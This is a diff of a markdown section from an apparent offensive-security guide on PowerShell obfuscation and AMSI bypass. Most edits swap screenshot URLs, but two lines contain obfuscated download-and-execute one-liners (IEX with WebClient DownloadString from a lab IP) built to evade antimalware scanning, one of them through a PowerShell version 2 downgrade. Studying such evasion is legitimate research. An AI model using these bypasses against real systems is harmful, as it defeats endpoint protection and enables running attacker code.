@@ -773,7 +773,7 @@ Here we can view the all process of encoding/decoding in powershell console
       Microsoft’s Antimalware Scan Interface (AMSI) was introduced in Windows 10 as a standard interface
       that provides the ability for AV engines to apply signatures to buffers both in memory and on disk.
 
-![enigma0x3 - AMSI Bypass](http://i.cubeupload.com/6y9yF9.png)
+![enigma0x3 - AMSI Bypass](http://i66.tinypic.com/mrstv9.png)
 `HINT: Invoke-Expression powershell command flagging AMSI detection`<br />
 
 <br />
@@ -799,11 +799,11 @@ Here we can view the all process of encoding/decoding in powershell console
       you will notice that it is allowed to execute because AMSI is unable to access any of the scanning
       methods via its COM interface:
 
-![enigma0x3 - AMSI Bypass](http://i.cubeupload.com/Tn2SZD.png)
+![enigma0x3 - AMSI Bypass](http://i67.tinypic.com/2vv6x41.png)
 
 - **Being mean** .. [ one agent.bat with AMSI bypass abilities ;) ]<br />
 
-![enigma0x3 - AMSI Bypass](http://i.cubeupload.com/T1TFFB.png)
+![enigma0x3 - AMSI Bypass](http://i65.tinypic.com/2rpv0hv.png)
 
 ---
 
@@ -824,12 +824,14 @@ Here we can view the all process of encoding/decoding in powershell console
 
 - OR (using [#NULL] before the monitorized syscall)
 
-      powershell Write-Host "#<NULL>"; I`E`X ('({0}w-Object {0}t.WebC{3}nt).{1}String("{2}19`2.16`8.1`.7`1/In`vok`e-He`ll`o.ps`1")' -f'Ne','Download','http://','lie')
+      powershell Write-Host "#<NULL>"; I`E`X ('({0}w-Object {0}t.WebC{3}nt).{1}String("{2}19`2.168.1.71/hello.ps1")' -f'Ne','Download','http://','lie')
+
+![enigma0x3 - AMSI Bypass](http://i63.tinypic.com/14ec6f5.jpg)
 
 
 - For file contents<br />
 
-![enigma0x3 - AMSI Bypass](http://i.cubeupload.com/DRUo9T.png)
+![enigma0x3 - AMSI Bypass](http://i64.tinypic.com/15d8gsy.png)
 
 ---
 
@@ -843,10 +845,10 @@ Here we can view the all process of encoding/decoding in powershell console
 
 - Oneliner AMSI bypass<br />
 
-      powershell.exe -version 2 IEX (New-Object Net.WebClient).DownloadString('ht'+'tp:'+'//19'+'2.16'+'8.1.71/Hello.ps1')
+      powershell.exe -version 2 IEX (New-Object Net.WebClient).DownloadString('ht'+'tp:'+'//19'+'2.16'+'8.1.71/hello.ps1')
       
 
-![AMSI Bypass](http://i.cubeupload.com/96RKEi.jpg)
+![AMSI Bypass](http://i68.tinypic.com/2hd88yg.jpg)
 
 
 [0] [Glosario (Index)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario-index)<br />
